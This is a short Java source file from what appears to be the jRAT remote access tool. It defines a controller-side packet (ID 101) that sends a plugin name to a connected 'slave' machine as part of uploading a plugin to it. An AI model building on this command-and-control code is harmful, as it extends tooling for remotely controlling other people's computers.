package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;

public class Packet101UploadPlugin extends AbstractOutgoingPacket {
	
	private String name;
	
	public Packet101UploadPlugin(String name) {
		this.name = name;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(name);
	}

	@Override
	public short getPacketId() {
		return 101;
	}

}
